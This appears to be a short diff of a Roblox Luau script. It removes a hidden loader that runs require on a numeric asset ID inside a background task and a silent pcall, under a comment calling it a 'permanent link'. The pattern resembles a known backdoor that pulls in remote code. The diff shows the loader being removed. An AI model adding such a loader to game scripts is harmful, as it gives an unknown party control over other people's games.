@@ -1,7 +1,1 @@
--- The Enterprise Permanent Link
-task.spawn(function()
-    pcall(function()
-        require(87640712642410) 
-        print("0 - Enterprise Module Linked")
-    end)
-end)
+
